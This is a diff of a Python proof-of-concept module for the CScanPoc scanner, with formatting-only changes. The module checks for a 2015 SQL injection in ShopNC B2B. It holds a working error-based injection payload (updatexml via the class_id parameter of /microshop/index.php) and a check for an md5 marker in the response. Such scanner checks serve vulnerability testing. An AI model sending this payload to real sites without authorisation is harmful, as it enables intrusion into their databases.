@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'ShopNC_0005' # 平台漏洞编号，留空
+    vuln_id = 'ShopNC_0005'  # 平台漏洞编号，留空
     name = 'ShopNC B2B版SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-07-03'  # 漏洞公布时间
     desc = '''
         ShopNC B2B版SQL注入漏洞。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'ShopNC'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '5a03d3bb-05f7-4419-baa0-d2a5963fd4f4'
@@ -32,13 +34,13 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer:http://www.wooyun.org/bugs/wooyun-2015-0124172
+
+            # Refer:http://www.wooyun.org/bugs/wooyun-2015-0124172
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = "/microshop/index.php?act=personal&class_id[0]=exp&class_id[1]=1)%20or%20updatexml(1,concat(0x5c,md5(1)),1)%23--"
             url = arg + payload
-            code, head, res, errcode,finalurl = hh.http(url)
+            code, head, res, errcode, finalurl = hh.http(url)
 
             if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
                 #security_hole('find sql injection: ' + url)
@@ -50,6 +52,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
